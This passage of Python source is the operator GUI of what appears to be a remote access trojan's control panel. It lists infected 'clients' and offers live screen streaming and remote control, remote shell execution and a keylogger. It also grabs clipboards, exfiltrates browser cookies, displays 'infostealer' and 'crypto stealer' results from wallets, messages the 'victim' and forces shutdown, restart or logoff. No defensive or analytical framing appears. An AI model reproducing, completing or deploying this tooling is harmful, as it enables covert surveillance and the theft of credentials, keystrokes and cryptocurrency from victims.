        icon_circle.pack_propagate(False)
        ctk.CTkLabel(icon_circle, text=os_icon, font=("Segoe UI", 13, "bold"),
                      text_color=THEME["black"], width=32, height=32).pack(expand=True)

        info_frame = ctk.CTkFrame(card, fg_color="transparent")
        info_frame.pack(side="left", fill="both", expand=True, pady=6)
        ctk.CTkLabel(info_frame, text=info.get("hostname", "Unknown"),
                      font=("Segoe UI", 11, "bold"),
                      text_color=THEME["text"]).pack(anchor="w")
        username = info.get("username", "")
        if username:
            ctk.CTkLabel(info_frame, text=username,
                          font=("Segoe UI", 9),
                          text_color=THEME["text_dim"]).pack(anchor="w")
        ip_port = info.get("ip_port", client_id)
        ctk.CTkLabel(info_frame, text=ip_port,
                      font=("Consolas", 8),
                      text_color=THEME["text_muted"]).pack(anchor="w")

        card._client_id = client_id
        card.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))
        for child in card.winfo_children():
            child.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))
            for sub in child.winfo_children():
                sub.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))
                for sub2 in sub.winfo_children():
                    sub2.bind("<Button-1>", lambda e, cid=client_id: self._select_client(cid))

        self._highlight_selected_client()

    def _highlight_selected_client(self):
        for widget in self.client_list.winfo_children():
            if hasattr(widget, "_client_id"):
                if widget._client_id == self.current_client:
                    widget.configure(border_width=2, border_color=THEME["accent"])
                else:
                    widget.configure(border_width=0, border_color=THEME["card"])

    def _remove_client_ui(self, client_id: str):
        if client_id == self.current_client:
            self.current_client = None
            self._stream_active = False
            self._control_active = False
            self.client_label.configure(text="No client selected")
            self.screen_canvas.delete("all")
            self.stream_btn.configure(text="  Start Stream  ",
                                       fg_color="transparent", border_color=THEME["green"],
                                       text_color=THEME["green"])
            self.control_btn.configure(text="  Enable Control  ",
                                        fg_color="transparent", border_color=THEME["amber"],
                                        text_color=THEME["amber"])
        self._refresh_clients()

    def _select_client(self, client_id: str):
        self.current_client = client_id
        clients = self.server.get_clients()
        info = clients.get(client_id, {})
        self.client_label.configure(
            text=f"{info.get('hostname', '?')} ({client_id})")

        monitors = info.get("monitors", [])
        monitor_names = ["All Screens"]
        for m in monitors:
            name = m.get("name", f"Monitor {m.get('index', '?')}")
            w = m.get("width", "?")
            h = m.get("height", "?")
            monitor_names.append(f"{name} ({w}x{h})")
        self.monitor_menu.configure(values=monitor_names)
        self.monitor_var.set("All Screens")

        info_lines = [
            f"Host: {info.get('hostname', '?')}",
            f"User: {info.get('username', '?')}",
            f"OS: {info.get('os', '?')} {info.get('arch', '')}",
            f"Monitors: {len(monitors)}",
            f"IP: {info.get('ip_port', '?')}",
        ]
        self.info_text.delete("1.0", "end")
        self.info_text.insert("end", "\n".join(info_lines))

        self._highlight_selected_client()

    def _refresh_clients(self):
        for widget in self.client_list.winfo_children():
            widget.destroy()
        clients = self.server.get_clients()
        count = len(clients)
        self.client_count_label.configure(text=str(count))
        for cid, info in clients.items():
            self._add_client_ui(cid, info)

    def _on_monitor_select(self, choice: str):
        if not self.current_client:
            return
        monitors = self.server.get_clients().get(self.current_client, {}).get("monitors", [])
        if choice == "All Screens":
            self.server.select_monitor(self.current_client, 0)
        else:
            for m in monitors:
                name = m.get("name", f"Monitor {m.get('index', '?')}")
                w = m.get("width", "?")
                h = m.get("height", "?")
                label = f"{name} ({w}x{h})"
                if label == choice:
                    self.server.select_monitor(self.current_client, m.get("index", 0))
                    break

    def _toggle_stream(self):
        if not self.current_client:
            return
        if self._stream_active:
            self.server.stop_screen(self.current_client)
            self._stream_active = False
            self.stream_btn.configure(text="  Start Stream  ",
                                       fg_color="transparent", border_color=THEME["green"],
                                       text_color=THEME["green"])
            self.status_label.configure(text="Stream stopped")
        else:
            self.server.start_screen(self.current_client)
            self._stream_active = True
            self.stream_btn.configure(text="  Stop Stream  ",
                                       fg_color="transparent", border_color=THEME["red"],
                                       text_color=THEME["red"])
            self.status_label.configure(text="Streaming...")

    def _toggle_control(self):
        if not self.current_client:
            return
        if self._control_active:
            self.server.disable_control(self.current_client)
            self._control_active = False
            self.control_btn.configure(text="  Enable Control  ",
                                        fg_color="transparent", border_color=THEME["amber"],
                                        text_color=THEME["amber"])
            self.status_label.configure(text="Control disabled")
        else:
            self.server.enable_control(self.current_client)
            self._control_active = True
            self.control_btn.configure(text="  Disable Control  ",
                                        fg_color="transparent", border_color=THEME["red"],
                                        text_color=THEME["red"])
            self.status_label.configure(text="Control enabled")

    def _request_exfil(self, exfil_type: str):
        if not self.current_client:
            return
        self.server.request_exfil(self.current_client, exfil_type)
        self.status_label.configure(text=f"Requesting {exfil_type}...")

    def _show_exfil(self, exfil_type: str, data: dict):
        self.exfil_text.delete("1.0", "end")
        self.exfil_text.insert("end", f"=== {exfil_type.upper()} ===\n\n")
        if exfil_type == "browser_cookies":
            for browser in ["chrome", "edge"]:
                cookies = data.get(browser, [])
                if cookies:
                    self.exfil_text.insert("end", f"--- {browser.upper()} ({len(cookies)} cookies) ---\n\n")
                    by_domain = {}
                    for c in cookies:
                        domain = c.get("host", "?")
                        if domain not in by_domain:
                            by_domain[domain] = []
                        by_domain[domain].append(c)
                    for domain in sorted(by_domain.keys()):
                        self.exfil_text.insert("end", f"\n{domain}:\n")
                        for c in by_domain[domain]:
                            secure = " [Secure]" if c.get("secure") else ""
                            self.exfil_text.insert("end", f"  {c.get('name', '?')}={c.get('value', '?')[:80]}{secure}\n")
        elif isinstance(data, dict):
            for key, value in data.items():
                self.exfil_text.insert("end", f"{key}: {value}\n")
        else:
            self.exfil_text.insert("end", str(data))
        self.status_label.configure(text=f"{exfil_type} received")

    def _show_infostealer(self, data: dict):
        self.stealer_text.delete("1.0", "end")
        self.stealer_text.insert("end", "═══════════════════════════════\n")
        self.stealer_text.insert("end", "         INFOSTEALER RESULTS\n")
        self.stealer_text.insert("end", "═══════════════════════════════\n\n")

        browsers = data.get("browsers", data)
        if isinstance(browsers, dict):
            for browser_name, categories in browsers.items():
                self.stealer_text.insert("end", f"┌── {browser_name.upper()} ──\n")
                if isinstance(categories, dict):
                    for cat_name, cat_data in categories.items():
                        self.stealer_text.insert("end", f"│\n├─ {cat_name}:\n")
                        if isinstance(cat_data, list):
                            for item in cat_data[:50]:
                                if isinstance(item, dict):
                                    line = "  "
                                    for k, v in item.items():
                                        line += f"{k}={v}  "
                                    self.stealer_text.insert("end", f"│  {line}\n")
                                else:
                                    self.stealer_text.insert("end", f"│  {item}\n")
                            if len(cat_data) > 50:
                                self.stealer_text.insert("end", f"│  ... and {len(cat_data) - 50} more\n")
                        elif isinstance(cat_data, dict):
                            for k, v in cat_data.items():
                                self.stealer_text.insert("end", f"│  {k}: {v}\n")
                        else:
                            self.stealer_text.insert("end", f"│  {cat_data}\n")
                elif isinstance(categories, list):
                    for item in categories[:50]:
                        self.stealer_text.insert("end", f"│  {item}\n")
                self.stealer_text.insert("end", f"└──────────────────────────\n\n")
        elif isinstance(browsers, list):
            for item in browsers:
                self.stealer_text.insert("end", f"  {item}\n")

        self.status_label.configure(text="Infostealer data received")

    def _show_crypto_stealer(self, data: dict):
        self.crypto_text.delete("1.0", "end")
        self.crypto_text.insert("end", "═══════════════════════════════\n")
        self.crypto_text.insert("end", "       CRYPTO STEALER RESULTS\n")
        self.crypto_text.insert("end", "═══════════════════════════════\n\n")

        wallets = data.get("wallets", data)
        if isinstance(wallets, dict):
            for wallet_name, wallet_data in wallets.items():
                status = wallet_data.get("status", "Unknown") if isinstance(wallet_data, dict) else "Found"
                if status == "Found":
                    status_color = THEME["green"]
                elif status == "Not Found":
                    status_color = THEME["text_muted"]
                else:
                    status_color = THEME["amber"]

                self.crypto_text.insert("end", f"┌── {wallet_name} ──\n")
                self.crypto_text.insert("end", f"│  Status: {status}\n")

                if isinstance(wallet_data, dict):
                    wallet_info = wallet_data.get("data", wallet_data)
                    if isinstance(wallet_info, dict):
                        for k, v in wallet_info.items():
                            self.crypto_text.insert("end", f"│  {k}: {v}\n")
                    elif isinstance(wallet_info, list):
                        for item in wallet_info:
                            self.crypto_text.insert("end", f"│  {item}\n")
                    elif wallet_info and wallet_info != status:
                        self.crypto_text.insert("end", f"│  {wallet_info}\n")
                self.crypto_text.insert("end", f"└──────────────────────────\n\n")
        elif isinstance(wallets, list):
            for item in wallets:
                self.crypto_text.insert("end", f"  {item}\n")

        self.status_label.configure(text="Crypto stealer data received")

    def _send_shell_command(self, event=None):
        if not self.current_client:
            return
        cmd = self.shell_input.get().strip()
        if not cmd:
            return
        self.shell_input.delete(0, "end")
        self.shell_text.insert("end", f"$ {cmd}\n")
        self.shell_text.see("end")
        self.server.exec_shell(self.current_client, cmd)
        self.status_label.configure(text=f"Executing: {cmd}")

    def _handle_shell_output(self, data: dict):
        output = data.get("output", "")
        cmd = data.get("command", "")
        if output:
            self.shell_text.insert("end", f"{output}\n")
            self.shell_text.see("end")
        self.status_label.configure(text=f"Command completed: {cmd}")

    def _refresh_processes(self):
        if not self.current_client:
            return
        self.server.request_processes(self.current_client)
        self.status_label.configure(text="Requesting processes...")

    def _handle_process_data(self, data: dict):
        if "error" in data:
            self.process_tree.delete("1.0", "end")
            self.process_tree.insert("end", f"Error: {data['error']}")
            return
        procs = data.get("processes", [])
        self._process_data = procs
        self.process_tree.delete("1.0", "end")
        header = f"{'PID':>8}  {'Name':<35} {'User':<20} {'CPU%':>6} {'Mem%':>6}\n"
        self.process_tree.insert("end", header)
        self.process_tree.insert("end", "-" * 80 + "\n")
        for p in sorted(procs, key=lambda x: x.get("cpu", 0), reverse=True):
            line = f"{p.get('pid', 0):>8}  {p.get('name', '?'):<35} {p.get('username', '?'):<20} {p.get('cpu', 0):>5.1f}% {p.get('memory', 0):>5.1f}%\n"
            self.process_tree.insert("end", line)
        self.process_tree.see("1.0")
        self.status_label.configure(text=f"{len(procs)} processes loaded")

    def _kill_selected_process(self):
        if not self.current_client or not self._process_data:
            return
        try:
            cursor_pos = self.process_tree.index("insert")
            line_num = int(cursor_pos.split(".")[0])
            if line_num < 3:
                return
            content = self.process_tree.get("1.0", "end")
            lines = content.strip().split("\n")
            if line_num < len(lines):
                parts = lines[line_num - 1].split()
                if parts:
                    pid = int(parts[0])
                    if messagebox.askyesno("Kill Process", f"Kill process {pid}?"):
                        self.server.kill_process(self.current_client, pid)
                        self.status_label.configure(text=f"Killing PID {pid}")
        except Exception:
            pass

    def _toggle_keylog(self):
        if not self.current_client:
            return
        if self._keylog_active:
            self.server.stop_keylog(self.current_client)
            self._keylog_active = False
            self.keylog_btn.configure(text="Start Keylogger", fg_color=THEME["green"])
            self.status_label.configure(text="Keylogger stopped")
        else:
            self.server.start_keylog(self.current_client)
            self._keylog_active = True
            self.keylog_btn.configure(text="Stop Keylogger", fg_color=THEME["red"])
            self.status_label.configure(text="Keylogger started")

    def _clear_keylog(self):
        self.keylog_text.delete("1.0", "end")

    def _handle_keylog_data(self, data: dict):
        keys = data.get("keys", "")
        if keys:
            self.keylog_text.insert("end", keys)
            self.keylog_text.see("end")

    def _refresh_clipboard(self):
        if not self.current_client:
            return
        self.server.get_clipboard(self.current_client)
        self.status_label.configure(text="Requesting clipboard...")

    def _handle_clipboard_data(self, data: dict):
        content = data.get("content", "")
        self.clipboard_text.delete("1.0", "end")
        self.clipboard_text.insert("end", content)
        self.status_label.configure(text="Clipboard updated")

    def _send_chat(self, event=None):
        if not self.current_client:
            return
        msg = self.chat_input.get().strip()
        if not msg:
            return
        self.chat_input.delete(0, "end")
        self.server.send_chat(self.current_client, msg)
        timestamp = time.strftime("%H:%M:%S")
        self._chat_messages.append(f"[{timestamp}] YOU: {msg}")
        self.chat_display.insert("end", f"[{timestamp}] YOU: {msg}\n")
        self.chat_display.see("end")
        self.status_label.configure(text="Message sent")

    def _send_chat_popup(self):
        if not self.current_client:
            return
        dialog = ctk.CTkToplevel(self.root)
        dialog.title("Send Message")
        dialog.geometry("400x150")
        dialog.configure(fg_color=THEME["panel"])
        dialog.transient(self.root)
        dialog.grab_set()

        ctk.CTkLabel(dialog, text="Message to display on victim's screen:",
                      font=("Segoe UI", 11), text_color=THEME["text"]).pack(padx=16, pady=(16, 8), anchor="w")
        entry = ctk.CTkEntry(dialog, placeholder_text="Enter message...",
                              fg_color=THEME["card"], text_color=THEME["text"],
                              border_color=THEME["border"],
                              font=("Segoe UI", 11), width=360, height=36)
        entry.pack(padx=16, pady=4)
        entry.focus()

        def send():
            msg = entry.get().strip()
            if msg:
                self.server.send_chat(self.current_client, msg)
                timestamp = time.strftime("%H:%M:%S")
                self._chat_messages.append(f"[{timestamp}] YOU: {msg}")
                self.chat_display.insert("end", f"[{timestamp}] YOU: {msg}\n")
                self.chat_display.see("end")
                dialog.destroy()

        entry.bind("<Return>", lambda e: send())
        ctk.CTkButton(dialog, text="Send", command=send,
                       fg_color=THEME["accent"], hover_color=THEME["accent_hover"],
                       text_color=THEME["black"], height=32,
                       font=("Segoe UI", 10, "bold")).pack(pady=8)

    def _handle_chat_display(self, data: dict):
        msg = data.get("message", "")
        if msg:
            timestamp = time.strftime("%H:%M:%S")
            self._chat_messages.append(f"[{timestamp}] VICTIM: {msg}")
            self.chat_display.insert("end", f"[{timestamp}] VICTIM: {msg}\n")
            self.chat_display.see("end")

    def _power_action(self, action: str):
        if not self.current_client:
            return
        labels = {"shutdown": "SHUTDOWN", "restart": "RESTART", "logoff": "LOGOFF"}
        if messagebox.askyesno("Confirm", f"Are you sure you want to {labels.get(action, action)} the victim?"):
            if action == "shutdown":
                self.server.shutdown_client(self.current_client)
            elif action == "restart":
                self.server.restart_client(self.current_client)
            elif action == "logoff":
                self.server.logoff_client(self.current_client)
            self.status_label.configure(text=f"{labels.get(action, action)} sent")

    def _get_canvas_coords(self, event) -> tuple[int, int]:
        canvas_w = self.screen_canvas.winfo_width()
        canvas_h = self.screen_canvas.winfo_height()
        if canvas_w <= 1 or canvas_h <= 1:
            return 0, 0
        return event.x, event.y

    def _on_mouse_click(self, event):
        if not self._control_active or not self.current_client:
            return
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_click", x=x, y=y, button="left")

    def _on_mouse_drag(self, event):
        if not self._control_active or not self.current_client:
            return
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_move", x=x, y=y)

    def _on_mouse_release(self, event):
        pass

    def _on_mouse_double(self, event):
        if not self._control_active or not self.current_client:
            return
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_double", x=x, y=y)

    def _on_mouse_scroll(self, event):
        if not self._control_active or not self.current_client:
            return
        amount = -1 if event.delta > 0 else 1
        x, y = self._get_canvas_coords(event)
        self.server.send_input(self.current_client, "mouse_scroll", x=x, y=y, amount=amount)

    def _on_mouse_move(self, event):
        pass

    def _on_right_click(self, event):
        if not self.current_client:
            return
        menu = tk.Menu(self.root, tearoff=0, bg=THEME["panel"], fg=THEME["text"],
                        activebackground=THEME["accent"], activeforeground=THEME["black"],
                        font=("Segoe UI", 10))
        menu.add_command(label="Right Click", command=lambda: self.server.send_input(
            self.current_client, "mouse_click", x=event.x, y=event.y, button="right"))
        menu.add_separator()
        menu.add_command(label="Copy", command=lambda: self.server.send_input(
            self.current_client, "key_press", key="ctrl+c"))
        menu.add_command(label="Paste", command=lambda: self.server.send_input(
            self.current_client, "key_press", key="ctrl+v"))
        menu.add_command(label="Select All", command=lambda: self.server.send_input(
            self.current_client, "key_press", key="ctrl+a"))
        menu.add_separator()
        menu.add_command(label="Delete", command=lambda: self.server.send_input(
            self.current_client, "key_press", key="delete"))
        menu.add_command(label="Enter", command=lambda: self.server.send_input(
            self.current_client, "key_press", key="enter"))
        menu.add_command(label="Escape", command=lambda: self.server.send_input(
            self.current_client, "key_press", key="escape"))
        menu.tk_popup(event.x_root, event.y_root)

    def _poll_clients(self):
        self._refresh_clients()
        self.root.after(2000, self._poll_clients)

    def run(self):
        self.root.mainloop()

    def stop(self):
        self.server.stop()
        self.root.destroy()
